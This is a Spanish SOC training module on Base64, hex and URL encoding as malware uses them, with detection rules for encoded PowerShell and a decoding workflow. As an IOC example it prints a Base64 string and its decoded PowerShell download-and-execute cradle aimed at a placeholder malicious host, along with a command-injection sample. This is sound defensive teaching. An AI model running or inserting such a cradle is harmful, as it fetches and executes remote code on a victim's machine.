# 01 — Codificación: Base64, Hex y el Malware

> **Slide relacionado:** 03 de `crypto-soc-training.html`

---

## ¿Qué es la codificación?

La codificación convierte datos a un formato diferente para compatibilidad, transmisión o representación. **No es seguridad.** Cualquiera puede revertirlo.

---

## Base64

### ¿Cómo funciona?

Base64 toma bytes binarios y los representa usando solo 64 caracteres imprimibles: `A-Z`, `a-z`, `0-9`, `+`, `/`. El `=` al final es padding.

```
Input:  "Hola SOC"
Output: "SG9sYSBTT0M="
```

Cada 3 bytes de input → 4 caracteres Base64. Por eso el output siempre es ~33% más largo.

### ¿Por qué lo usa el malware?

1. **Evasión de AV:** El payload en texto plano puede tener firmas conocidas. En Base64, no.
2. **Ofuscación:** Un analista desprevenido no lo lee directamente.
3. **Compatibilidad:** Permite enviar datos binarios por canales que solo aceptan texto (email, HTTP headers, scripts).
4. **Multiples capas:** El malware puede usar Base64 → Base64 → Base64 para dificultar análisis.

### Detección en PowerShell (crítico para SOC)

```powershell
# Patrones que deben disparar alertas:
powershell -enc <base64>
powershell -EncodedCommand <base64>
[System.Convert]::FromBase64String("...")
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("..."))
```

**Ejemplo de IOC real:**
```
cG93ZXJzaGVsbCAtZW5jb2RlZCBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9tYWxpY2lvdXMuY29tL3BheWxvYWQnKQ==
```

Decodificado:
```
powershell -encoded IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')
```

### Cómo identificar Base64 a simple vista

- Termina en `=` o `==` (padding)
- Solo contiene: `A-Z`, `a-z`, `0-9`, `+`, `/`
- La longitud siempre es múltiplo de 4
- Parece "texto random" pero tiene distribución uniforme de caracteres

---

## Hex (Base16)

### ¿Cómo funciona?

Representa cada byte como dos dígitos hexadecimales: `0-9` y `A-F`.

```
Input:  "SOC"
Output: "534F43"
```

### Uso en malware

- Shellcode en scripts: `\x41\x42\x43` = "ABC"
- Hashes de archivos como IOCs
- Representación de IPs en registros de red
- Direcciones de memoria en dumps forenses

### Cómo identificar Hex a simple vista

- Solo contiene: `0-9`, `A-F` (case insensitive)
- La longitud siempre es par
- Puede tener prefijo `0x` o separadores `:`

---

## URL Encoding

```
Input:  "cmd.exe /c whoami"
Output: "cmd.exe%20%2Fc%20whoami"
```

Usado en inyecciones web, evasión de WAF, logs de servidores web.

---

## Herramientas para decodificar rápido

| Herramienta | Uso |
|-------------|-----|
| [CyberChef](https://gchq.github.io/CyberChef/) | Swiss army knife — decode visual en el browser |
| `base64 -d` (Linux) | `echo "SG9sYQ==" \| base64 -d` |
| Python | `import base64; base64.b64decode("SG9sYQ==")` |
| PowerShell | `[System.Convert]::FromBase64String("SG9sYQ==")` |
| [de4js](https://de4js.kshift.me/) | Deobfuscación de JavaScript |

---

## Relevancia SOC 🔍

### Reglas de detección (lógica, no Sigma específico)

```
# SIEM: detectar PowerShell con encoding
process_name = "powershell.exe"
AND (
  command_line CONTAINS "-enc" OR
  command_line CONTAINS "-EncodedCommand" OR
  command_line CONTAINS "FromBase64String"
)

# Longitud anómala del comando (payloads Base64 son largos)
AND len(command_line) > 1000
```

### Workflow de análisis

```
Ver string sospechoso
       ↓
¿Solo tiene A-Za-z0-9+/= ?
       ↓ SÍ
¿Termina en = o == ?
       ↓ SÍ
Probablemente Base64 → decodificar con CyberChef
       ↓
¿El resultado es legible o binario?
       ↓
Legible → analizar el comando/payload
Binario → puede ser otro layer o shellcode
```

---

## Próximo tema
→ [02_hashing.md](./02_hashing.md) — Funciones hash y su uso forense
